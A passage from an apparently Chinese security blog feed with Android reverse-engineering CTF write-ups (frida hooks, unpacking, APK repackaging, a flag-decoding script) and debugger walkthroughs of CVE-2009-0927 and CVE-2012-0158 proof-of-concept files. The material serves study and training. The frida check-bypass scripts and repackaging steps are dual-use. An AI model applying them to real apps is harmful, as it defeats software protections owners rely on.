<li>在jadx里面看到只传递了一个参数，这里可以看到又三个参数，实际只有第三个参数_a3_才是我们传递的字符串参数，_a1_是JNIEnv* ，_a2_是JavaObject（表示Java层调用该JNI函数的对象的引用（即Java对象的指针））</li>
</ul>
<h4 id="修复完成之后我们来看一下这个函数"><a href="#修复完成之后我们来看一下这个函数" class="headerlink" title="修复完成之后我们来看一下这个函数"></a>修复完成之后我们来看一下这个函数</h4><img src="/2023/07/09/CTF003/image-20230709144614920.png" class="" title="image-20230709144614920">

<p>根据图中可知返回值来自于<strong>strcmp</strong>的比较结果，只有返回值为true也就是两个参数相等的情况下，验证才能通过。_strcmp_的两个参数都来自于_convertUnCharToStr_方法。这样的话可以尝试一下看能不能用_frida-trace_跟踪一下调用函数来查看这两个参数的值分别是什么</p>
<h3 id="使用frida-trace来hook函数的传参"><a href="#使用frida-trace来hook函数的传参" class="headerlink" title="使用frida-trace来hook函数的传参"></a>使用frida-trace来hook函数的传参</h3><img src="/2023/07/09/CTF003/image-20230709144627303.png" class="" title="image-20230709144627303">

<p>这里我们可以看到成功的跟踪到了这两个函数，但是_<strong>strcmp()</strong>_触发的有点多，可能代码里面有很多比较的地方，<br>_<strong>convertUnCharToStr()</strong>_触发较少方便我们查看参数。<br>来查看一下跟踪到的函数：发现这里没有识别出来函数的参数可能是因为识别不准确造成的</p>
<img src="/2023/07/09/CTF003/image-20230709144651083.png" class="" title="image-20230709144651083">

<h4 id="根据函数原型编写hook脚本"><a href="#根据函数原型编写hook脚本" class="headerlink" title="根据函数原型编写hook脚本"></a>根据函数原型编写hook脚本</h4><pre><code class="c">void convertUnCharToStr(char* str, unsigned char* UnChar, int ucLen)
</code></pre>
<p>根据函数原型修改一下代码读取一下参数的值：获取so库函数的参数需要从内存中读取</p>
<img src="/2023/07/09/CTF003/image-20230709144715947.png" class="" title="image-20230709144715947">

<p>修改完成之后保存，再点击验证按钮执行的时候看脚本打印结果</p>
<img src="/2023/07/09/CTF003/image-20230709144751559.png" class="" title="image-20230709144751559">

<p>可以看到一串能读懂的字符串我们来试一下这个是不是就是flag</p>
<img src="/2023/07/09/CTF003/image-20230709144803178.png" class="" title="image-20230709144803178">

<p>输入之后点击验证按钮我们就能看到这个信封解封了<br><strong>over~</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android CTF</tag>
        <tag>frida-hook</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF004</title>
    <url>/2023/07/09/CTF004/</url>
    <content><![CDATA[<h3 id="1-脱壳"><a href="#1-脱壳" class="headerlink" title="1. 脱壳"></a>1. 脱壳</h3><p>用jadx打开之后发现有加壳那先脱壳再分析</p>
<img src="/2023/07/09/CTF004/image-20230709013442386.png" class="" title="image-20230709013442386">

<p>看名字是一个_qihoo_的壳，这个呢我们使用反射大师去脱壳，反射大师需要运行在安卓7.1以下的系统上<br>在root过的手机上安装一个_VMOS Pro_模拟一个安卓7.1的系统<br>安装上反射大师和CTF004,注意：反射大师需要重启才能启用<br>然后打开反射大师，选择我们的CTF004并打开</p>
<img src="/2023/07/09/CTF004/image-20230709013731077.png" class="" title="image-20230709013731077">

<p>然后点击这个芒星点击 当前ACTIVITY</p>
<img src="/2023/07/09/CTF004/image-20230709013744990.png" class="" title="image-20230709013744990">

<p>然后点击写出DEX-&gt;修复Magic-&gt;确定<br>之后去提示的路径处将文件拷贝到物理机，再使用_adb pull_命令拉取下来对脱壳后的文件开始分析。</p>
<img src="/2023/07/09/CTF004/image-20230709013759330.png" class="" title="image-20230709013759330">

<h3 id="2-开始分析"><a href="#2-开始分析" class="headerlink" title="2. 开始分析"></a>2. 开始分析</h3><h4 id="分析代码逻辑"><a href="#分析代码逻辑" class="headerlink" title="分析代码逻辑"></a>分析代码逻辑</h4><img src="/2023/07/09/CTF004/image-20230709013828469.png" class="" title="image-20230709013828469">

<p>进来_MainActivity_之后发现_onCreate_函数都在native层去实现了，那再看看其它的类<br>点进Flag类</p>
<img src="/2023/07/09/CTF004/image-20230709013838746.png" class="" title="image-20230709013838746">

<p>进来之后发现这里面有些需要我们注意的点：</p>
<pre><code>  1. 有两个key
  2. 有计算这两个key的地方，且在MyService类中进行了对比如果符合条件会去调用calcFlagFirstStep()
</code></pre>
<img src="/2023/07/09/CTF004/image-20230709013850294.png" class="" title="image-20230709013850294">

<ol start="3">
<li>调用之后会去执行comm()方法对接收到的字符串进行一系列操作</li>
</ol>
<h4 id="hook获取Flag"><a href="#hook获取Flag" class="headerlink" title="hook获取Flag"></a>hook获取Flag</h4><p>接下来我们写脚本来hook以下这两个计算函数看返回值是什么就可以直接拿到Flag了</p>
<pre><code class="js">setImmediate(function(){
    Java.perform(function(){
        // 因为这个hook不需要实例化所以直接使用Java.use就可以
        var Flag = Java.use("ctf.crack.vulcrack.Flag")
        var ret1 = Flag.calcFlagFirstStep();
        console.log("ret1= "+ret1);
        var ret2 = Flag.calcFlagSecondStep();
        console.log("ret2= "+ret2);

    })
})
</code></pre>
<p> 执行hook脚本</p>
<img src="/2023/07/09/CTF004/image-20230709014023478.png" class="" title="image-20230709014023478">

<p><strong>这里可以看到两个返回值加起来就是完整的Flag。</strong></p>
<p><strong>over~</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android脱壳</tag>
        <tag>Android CTF</tag>
        <tag>frida-hook</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF005</title>
    <url>/2023/07/08/CTF005/</url>
    <content><![CDATA[<img src="/2023/07/08/CTF005/image-20230708205138665.png" class="" title="image-20230708205138665">

<p><strong>PS：这个题目比较简单，尝试采用多种不同的方式去获取flag</strong></p>
<h3 id="第一种方式：静态分析"><a href="#第一种方式：静态分析" class="headerlink" title="第一种方式：静态分析"></a>第一种方式：静态分析</h3><p>用jadx打开进入口点看代码逻辑</p>
<img src="/2023/07/08/CTF005/image-20230708205241183.png" class="" title="image-20230708205241183">

<p> 看入口点的代码非常简单明了进入case vip分支就算是通过了验证，那我们跟进去看一下它里面有没有校验的函数</p>
<img src="/2023/07/08/CTF005/image-20230709010401719.png" class="" title="image-20230709010401719">

<p>进来之后发现它只是用_setContenView_方法加载了一个新的布局，那去看一眼这个布局的xml文件<br>资源文件在res-&gt;layout文件夹里面：进来之后发现flag是一个明文存储的字符串</p>
<img src="/2023/07/08/CTF005/image-20230709010417770.png" class="" title="image-20230709010417770">

<p>这个比较简单，再使用改跳转重打包的方式获取flag试一下</p>
<h3 id="第二种方式：重打包"><a href="#第二种方式：重打包" class="headerlink" title="第二种方式：重打包"></a>第二种方式：重打包</h3><p>使用_AndroidKiller_重打包改一下apk的执行流程：先来分析一下代码看修改哪里才能让我们获取到flag</p>
<img src="/2023/07/08/CTF005/image-20230709010525101.png" class="" title="image-20230709010525101">

<ol>
<li>首先我们点击首页的“点我获取FLAG”按钮之后会进入第一个case，之后会校验<strong>a</strong>的值大于30才能跳转往else分支充钱，<strong>这里可以把跳转改为(a &gt; 30)</strong></li>
<li>之后我们再看一下”<strong>充钱”<strong>之后创建的新对象</strong>b</strong>做了什么</li>
</ol>
<img src="/2023/07/08/CTF005/image-20230709010543229.png" class="" title="image-20230709010543229">

<p>创建共享对象并将其中<strong>points</strong>的值减去了<strong>30</strong>，来手动查看一下共享对象文件中的内容</p>
<img src="/2023/07/08/CTF005/image-20230709010633625.png" class="" title="image-20230709010633625">

<img src="/2023/07/08/CTF005/image-20230709010639454.png" class="" title="image-20230709010639454">

<p>当我们点击”充钱“按钮之后，<strong>b</strong>类会设置‘<em>TextView</em>’的文本，设置‘<em>points</em>’的值，弹出一个提示吐司</p>
<ol>
<li>重新打开应用之后’<em>TextView</em>’的文本就改变了</li>
</ol>
<img src="/2023/07/08/CTF005/image-20230709010728913.png" class="" title="image-20230709010728913">

<img src="/2023/07/08/CTF005/image-20230709010813560.png" class="" title="image-20230709010813560">

<ul>
<li>重新设置布局、设置按钮监听事件，根据积分设置相关试图的状态</li>
</ul>
<ol start="2">
<li>这样看来我们只需要改变前面的if判断条件**(a &gt; 30)**就可以了</li>
</ol>
<p>​	用AndroidKiller打开apk，搜索里面的字符串定位if分支</p>
<img src="/2023/07/08/CTF005/image-20230709010946212.png" class="" title="image-20230709010946212">

<p>定位到之后修改里面的if判断条件</p>
<img src="/2023/07/08/CTF005/image-20230709010957788.png" class="" title="image-20230709010957788">

<p> 修改完成之后重新编译打包即可</p>
<img src="/2023/07/08/CTF005/image-20230709011045124.png" class="" title="image-20230709011045124">

<img src="/2023/07/08/CTF005/CTF005.gif" class="" title="CTF005">

<h3 id="第三种方式：frida-hook"><a href="#第三种方式：frida-hook" class="headerlink" title="第三种方式：frida-hook"></a>第三种方式：frida-hook</h3><p>对这道题目写hook脚本的话，可以去hook它if判断时候用到的view.getId()方法</p>
<pre><code class="javascript">setImmediate(function(){
  Java.perform(function(){
    var View = Java.use("android.view.View");
    View.getId.implementation = function(){
      var ret = this.getId();
      ret = 2131296337;   // 修改getId()的返回值为vip的值
      return ret;
    }        
  })
})
</code></pre>
<p>注入脚本</p>
<img src="/2023/07/08/CTF005/image-20230709011305718.png" class="" title="image-20230709011305718">

<img src="/2023/07/08/CTF005/CTF005_hook.gif" class="" title="CTF005_hook">

<p><strong>over~</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android CTF</tag>
        <tag>frida-hook</tag>
        <tag>重打包</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF006</title>
    <url>/2023/07/07/CTF006/</url>
    <content><![CDATA[<p>本节主要内容是通过分析题目中的so文件加密，去写出反解脚本计算flag</p>
<span id="more"></span>



<img src="/2023/07/07/CTF006/image-20230708111943817.png" class="" title="image-20230708111943817">

<h3 id="1-用jadx查看入口点"><a href="#1-用jadx查看入口点" class="headerlink" title="1. 用jadx查看入口点"></a>1. 用jadx查看入口点</h3><p>在<em>AndroidManifest.xml</em>里面找到入口函数</p>
<!-- more -->

<img src="/2023/07/07/CTF006/image-20230708112024572.png" class="" title="image-20230708112024572">

<h4 id="1-1-看这段代码我们需要关注两个方法："><a href="#1-1-看这段代码我们需要关注两个方法：" class="headerlink" title="1.1. 看这段代码我们需要关注两个方法："></a>1.1. 看这段代码我们需要关注两个方法：</h4><pre><code>  1. getSecret()是一个native层的函数，这个函数对编辑框的内容进行了一定的处理之后返回了ans
  2. check()方法校验，通过校验才能得到正确的Flag
</code></pre>
<p>先分析下chek()是怎么实现的，等下再去看native层。</p>
<h3 id="2-查看check-方法"><a href="#2-查看check-方法" class="headerlink" title="2. 查看check()方法"></a>2. 查看check()方法</h3><img src="/2023/07/07/CTF006/image-20230708123143622.png" class="" title="image-20230708123143622">

<p>这段代码的主要作用是从数据库中取出<strong>secret</strong>值（用hello的MD5值作为name对应的secret值）与我们输入的值（经过getSecret()方法处理）进行比较相等就返回true。</p>
<img src="/2023/07/07/CTF006/image-20230708123203528.png" class="" title="image-20230708123203528">

<p>分析完check()方法之后，现在我们可知：</p>
<ul>
<li>输入编辑框的值经过getSecret()的运算之后 = ‘kEvKc|roAkNADgGExUeq’就可以通过校验</li>
</ul>
<p>那接下来我们去分析一下getSecret()这个方法。</p>
<h3 id="3-分析getSecret"><a href="#3-分析getSecret" class="headerlink" title="3. 分析getSecret()"></a>3. 分析getSecret()</h3><h4 id="3-1-用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析"><a href="#3-1-用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析" class="headerlink" title="3.1. 用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析"></a>3.1. 用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析</h4><img src="/2023/07/07/CTF006/image-20230708123314917.png" class="" title="image-20230708123314917">

<h4 id="3-2-先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点"><a href="#3-2-先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点" class="headerlink" title="3.2. 先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点"></a>3.2. 先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点</h4><pre><code>  1. 代码通过接收我们输入的字符串，将其和内置的base_string进行一些运算得到一个新的字符串，最后将新的字符串返回
  2. 因为最后返回的新字符串是动态生成的，所以我们无法通过简单的hook去获取到正确的flag
  3. 这样子的话我们只能尝试一下看，能不能通过分析它的算法和入参写出它的反解算法
  4. 我们要详细分析算法写反解脚本的话，需要通过动态调试的方法来确定它的入参和返回值，另外静态反编译出来的伪代码可能也不准确不能支持我们去精确的写出反解算法
</code></pre>
<h3 id="4-用ida动态附加调试：attach过程略过"><a href="#4-用ida动态附加调试：attach过程略过" class="headerlink" title="4. 用ida动态附加调试：attach过程略过"></a>4. 用ida动态附加调试：attach过程略过</h3><h4 id="4-1-attach程序之后，找到我们的getSecret-方法下断点段下来"><a href="#4-1-attach程序之后，找到我们的getSecret-方法下断点段下来" class="headerlink" title="4.1. attach程序之后，找到我们的getSecret()方法下断点段下来"></a>4.1. attach程序之后，找到我们的getSecret()方法下断点段下来</h4><img src="/2023/07/07/CTF006/image-20230708123611283.png" class="" title="image-20230708123611283">

<img src="/2023/07/07/CTF006/image-20230708123621214.png" class="" title="image-20230708123621214">

<p>在函数开始的地方下断点，在手机上点击_<strong>TRY IT!</strong>_按钮之后我们可以中断在这里，这时候我们可以看到它的<strong>base_string</strong>字符串<br>_F8_继续往下跟，到获取dest[]的地方</p>
<img src="/2023/07/07/CTF006/image-20230708123650927.png" class="" title="image-20230708123650927">

<img src="/2023/07/07/CTF006/image-20230708123700143.png" class="" title="image-20230708123700143">

<p>分析后可以发现数组的内容是从0~0x44的dw数组。</p>
<h4 id="4-2-接下来开始分析for循环"><a href="#4-2-接下来开始分析for循环" class="headerlink" title="4.2. 接下来开始分析for循环"></a>4.2. 接下来开始分析for循环</h4><p><strong>第一个for循环</strong></p>
<img src="/2023/07/07/CTF006/image-20230708123740861.png" class="" title="image-20230708123740861">

<ul>
<li><p>循环的次数根据组的长度获得</p>
</li>
<li><p>循环取出dest[i]中的值 + <strong>0x10</strong>，然后再写回去</p>
<p><strong>第二个嵌套for循环</strong></p>
</li>
</ul>
<img src="/2023/07/07/CTF006/image-20230708123755894.png" class="" title="image-20230708123755894">

<ul>
<li>外层循环的次数是我们输入的字符串的长度</li>
<li>内存循环的次数是base_string字符串的长度</li>
<li>这个嵌套循环是将我们输入的字符逐个和base_string中的字符对比，相等的话就跳出本轮内层循环</li>
</ul>
<img src="/2023/07/07/CTF006/image-20230708123825332.png" class="" title="image-20230708123825332">

<p>用循环次数去dest[]中取出对应的值-&gt;再用这个取出的值去base_string中取出对应下标的字符-&gt;然后用这个字符替换掉我们输入的inputStr[外层循环]的字符</p>
<p><strong>最后一个循环</strong></p>
<img src="/2023/07/07/CTF006/image-20230708123945089.png" class="" title="image-20230708123945089">

<ul>
<li>最后一个循环时将我们前面循环生成的新字符串再次循环进行<strong>^</strong>操作，然后放回原位、</li>
</ul>
<h3 id="5-然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释"><a href="#5-然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释" class="headerlink" title="5. 然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释"></a>5. 然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释</h3><img src="/2023/07/07/CTF006/image-20230708124023310.png" class="" title="image-20230708124023310">

<h3 id="算法分析完成"><a href="#算法分析完成" class="headerlink" title="算法分析完成"></a>算法分析完成</h3><p>接下来我们就可以写这个算法的反解脚本了，写反解脚本可以从最后一个循环往前推过去</p>
<p><strong>结果字符串循环对字符进行与运算，然后再取模128确保结果不大于ASCII码的最大值-&gt;然后将计算完成的字符逐个在base_string里面找到字符对应的索引值(即dest[k]的值)-&gt;如果这个索引值小于16(dest[]中的最小值0x10)表示它对应的索引值在base_string的前16位-&gt;就把下标值加上base_string的长度-&gt;最后打印字符的时候还要把索引值([dest[i]])减去0x10</strong></p>
<pre><code class="python">static_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{|}~'
now = 'kEvKc|roAkNADgGExUeq'
for i, each in enumerate(now):
    tmp = chr((ord(each)^i)%128)
    index = static_str.find(tmp)
    if index &lt; 16:
        index = index + len(static_str) # 如果index &lt; 16，给index加上字符集长度实现循环查找
    print(static_str[index-16], end='')
</code></pre>
<img src="/2023/07/07/CTF006/image-20230708124148899.png" class="" title="image-20230708124148899">

<p><strong>over~</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android CTF</tag>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2009-0927:PDF中的JS</title>
    <url>/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/</url>
    <content><![CDATA[<h2 id="0x00：分析环境"><a href="#0x00：分析环境" class="headerlink" title="0x00：分析环境"></a>0x00：分析环境</h2><table>
<thead>
<tr>
<th></th>
<th>使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td>Vmware 16</td>
</tr>
<tr>
<td>Adobe Reader版本</td>
<td>9.0中文版</td>
<td></td>
</tr>
<tr>
<td>动态调试</td>
<td>OllyDbg v2.01</td>
<td>用的原版的OD其它的OD可能会断不下来</td>
</tr>
<tr>
<td>静态调试</td>
<td>IDA7.0</td>
<td></td>
</tr>
</tbody></table>
<span id="more"></span>

<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>​	首先用OD打开Adobe Reader 按F5使其正常运行（调试器需要设置步过int3中断和内存异常访问）</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022230847400.png" class="" title="image-20201022230847400">

<p>然后运行 poc.pdf ，OD会中断在0x00130000处产生内存写入异常。产生异常的原因是0x00130000这个地址已经超出了程序的内存空间范围，出现这种异常一般是复制了超长字符串导致的。</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022231914767.png" class="" title="image-20201022231914767">

<p>​	可以通过查看模块(alt+E),查看模块属性发现0x130000为只读属性</p>
<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>​	接下来我们开始分析异常产生的具体原因，先观察一下堆栈情况，可以看到程序在0x2210fe27中调用了strncpy，问题有可能就在这个函数里面，我们可以在汇编窗口中观察一下这个函数。</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022232324314.png" class="" title="image-20201022232324314">

<p>​	进入0x2210fe27之后我们可以看到0x2210FE25处 CALL EDI 调用了 strncp函数，按alt+E查看一下这个地址所在的模块用IDA打开查看一下函数结构。</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022235538635.png" class="" title="image-20201022235538635">

<p>​	用IDA打开此文件找到这个函数的位置按F5查看一下伪C代码</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023220723303.png" class="" title="image-20201023220723303">

<p>​	通过分析这段汇编代码发现strncpy的长度来源于字符串</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023221046299.png" class="" title="image-20201023221046299">

<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>​	接下来我们重新用OD重新动态分析，首先在0x2210FDEB处下条件断点’EAX-EDI&gt;600’(这个长度一般情况下大于正常字符串的长度小于异常情况下堆利用的字符串长度)</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023221613381.png" class="" title="image-20201023221613381">

<p>​	然后重新用OD加载AdobeReader，并打开POC，程序会断在我们设置的条件断点处，可以看到此时EAX-EDI=0X8005,再减一等于0X8004,并且此时EDI指向的位置存放数据为0C0C0C0C</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023222257857.png" class="" title="image-20201023222257857">

<p>继续往下调试到0x2210FE25	CALL EDI 处,可以发现src指向的位置的数据为0C0C0C0C,要复制的长度为0x8004</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023223038236.png" class="" title="image-20201023223038236">

<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023222829091.png" class="" title="image-20201023222829091">

<p>(dest=0x12E4B0) + (N=0x8004) = 0x1364B4,这个地址大于了0x130000前面我们通过查看模块发现0x130000为只读模块,所以这里写入会产生异常,这下可以确认这里就是溢出的根源了.</p>
<p>正常来说这个时候程序抛出异常之后会进入异常处理函数,先查看一下异常处理链</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023224822598.png" class="" title="image-20201023224822598">

<p>调用strncpy之前0x12E6B4中存放下一个SEH记录的位置,0x12E6B8存放本次异常处理的地址</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023225316223.png" class="" title="image-20201023225316223">

<p>现在我们按F8步过执行strncpy(),发现程序产生了写入0x130000异常中断,此时我们再来查看异常处理结构的内容,如下所示之前存放下一个SEH记录位置的数据已经被0C0C0C0C覆盖掉了</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230030389.png" class="" title="image-20201023230030389">

<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230050091.png" class="" title="image-20201023230050091">

<p>然后再调用异常处理函数就会执行0C0C0C0C处的内容,可以看到全部都是NOP指令</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230914434.png" class="" title="image-20201023230914434">

<p>根据POC的执行我们知道最后弹出了一个MessageBox,所以我们可以在MessageBoxA处下断点,然后栈回溯查看poc的代码</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023231315257.png" class="" title="image-20201023231315257">

<p>查看0x0C100008处的汇编代码,通过寻找user32找到kernel32的基址,然后通过hash值的对比来找到需要的导出函数,来实现了弹出MessageBox.</p>
<img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023233334952.png" class="" title="image-20201023233334952">

<p>分析完成~</p>
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>PDF漏洞</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2012-0158</title>
    <url>/2021/05/19/CVE-2012-0158/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
<li>漏洞编号：CVE-2012-0158</li>
<li>漏洞类型：栈溢出</li>
<li>漏洞影响：信息泄露</li>
<li>该漏洞一直是office漏洞史上的经典案例。该漏洞首次发现于2015年6月，目标主要为东南亚国家和地区，此次攻击事件被命名为“Lotus Blossom”行动。该行动从2012~2015持续了三年之久。</li>
<li>黑客组织在此次间谍行动中，主要通过构造恶意Office文档诱使目标上钩，从而在对方的计算机上植入木马，窃取机密信息。</li>
</ul>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>2012-0158是一个经典的栈溢出漏洞，成因在于office在解析activeX控件时调用系统的MSCOMCTL.OCX库中存在栈溢出漏洞，导致可被用于执行任意代码。</p>
<h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>操作系统：XP SP3 ~ WIN7</p>
<p>office版本：2003 ~ 2010</p>
<span id="more"></span>

<h2 id="二、调试环境"><a href="#二、调试环境" class="headerlink" title="二、调试环境"></a>二、调试环境</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><table>
<thead>
<tr>
<th></th>
<th>使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>xp SP3</td>
<td>简体中文版</td>
</tr>
<tr>
<td>虚拟机</td>
<td>VMware</td>
<td>16 pro</td>
</tr>
<tr>
<td>调试器</td>
<td>immunity debugger</td>
<td>1.85</td>
</tr>
<tr>
<td>反汇编器</td>
<td>IDA Pro</td>
<td>6.8</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>word</td>
<td>2007 中文版</td>
</tr>
<tr>
<td>office 格式分析工具</td>
<td>OffVis</td>
<td>1.1</td>
</tr>
</tbody></table>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
<li>漏洞文件：MSCOMCTL.OCX</li>
</ul>
<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><p>用immunity debugger附加word之后F9运行，将poc拖进word窗口打开之后，程序崩溃断下，如下图所示（如果栈中不显示模块地址的话，就<code>alt + E</code>到模块中刷新一下再返回模块地址就显示出来了）</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210301002358146.png" class="" title="image-20210301002358146">

<p>通过上图回溯栈上数据我们可以看到最近的返回地址在MSCOMCTL.275C8B91处，然后我们可以在左侧内存数据中跳转到275C8B91查看一下此处的汇编代码</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210301005617573.png" class="" title="image-20210301005617573">

<p>继续往上追溯，可以看到0x275C8B91是位于函数sub_275C8B4E中的，将sub_275C8B4E标记为VulFun函数，然后在VulFun函数入口地址0x275C8B4E处下断。但是我们如果直接在这个地址下普通断点的话是断不下来的，因为这个地址时固定的所以我们直接<code>alt + E</code>进入模块找到0x275C8B4E处下硬件断点即可，然后再每次重新打开poc的时候就会在这个地方断下来。</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210301200544912.png" class="" title="image-20210301200544912">

<p>然后我们F8单步</p>
<p>可以断下来之后，我们用IDA加载MSCOMCTL.OCX模块来看一下刚才标记的VulFun函数，可以看到这里面有一个sub_275C88F4函数被调用了两次，这里原本是<code>V5 == 1784835907</code>，将其标记为char类型之后为‘jboC’，这里按照小端存储的规则逆过来之后就是’Cobj’，后面的 <code>&amp;&amp;dwBytes &gt;= 8</code>，我们在immDbg中看到这个函数总共分配了0x14个字节大小的栈空间，在中间用掉了0xC个字节，剩余0x8字节，所以这里再判断 dwBytes &gt;= 8，将dwBytes个数据再拷贝到栈上的时候，由于复制的大小超出0x8个字节，会导致溢出。</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210302001708969.png" class="" title="image-20210302001708969">

<p>第一次调用sub_275C88F4复制了”Cobjd”字符串</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210303000306632.png" class="" title="image-20210303000306632">

<p>在第二次调用sub_275C88F4的时候发生了溢出</p>
<p>动态执行到第二次sub_275C88F4拷贝结束的时候可以看到返回地址已经被0x41414141覆盖了，验证了我们前面的分析</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210302000619198.png" class="" title="image-20210302000619198">

<p>现在我们已经大体上知道了溢出的点和原因在哪里，接下来我们分析一下poc.doc文件格式，看看程序是在解析doc文件中哪一字段时溢出的，下图是doc文件格式的开头内容</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210302235810422.png" class="" title="image-20210302235810422">

<p>导致漏洞的是\object标签的内容，其中的\objocx代表在OLE容器中嵌入OCX控件，后面的\objdata包含对象数据，OLE对象采用OLESaveToStream结构，后面的D0CF11E0是OLE签名，代表DOCFILE，从这里开始就是OLE数据。如果我们直接用OffVis打开poc.doc解析，会得到未发现OLESS签名的错误。</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210303001900921.png" class="" title="image-20210303001900921">

<p>这是因为poc.doc是RTF格式，里面的OLE数据是以文本形式存储，因此未被OffVis识别出来，可将从0xD0CF11E0开始至结尾的数据以16进制形式保存为test.doc，再用OffVis打开即可解析。</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210303004413687.png" class="" title="image-20210303004413687">

<p>关于上面CLSID对应的控件，直接通过OLE Viewer或者注册表搜索即可查找到是ListViewA控件。然后找到覆盖返回地址的0x41414141，它位于EleName = Contents的Data字段</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210303005915237.png" class="" title="image-20210303005915237">

<p>回头看下VulFun函数对此段数据的解析，回到IDA按F5查看C代码</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210304001450144.png" class="" title="image-20210304001450144">

<p>动态调试数据</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210303233354807.png" class="" title="image-20210303233354807">

<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>下载补丁后，用binDiff对比打补丁前后的修复情况。</p>
<img src="/2021/05/19/CVE-2012-0158/image-20210306192914998.png" class="" title="image-20210306192914998">

<p>这里新添加了对dwVersion的判断：需要dwVersion等于0x64，dwBytes等于8才继续执行，否则直接返回</p>
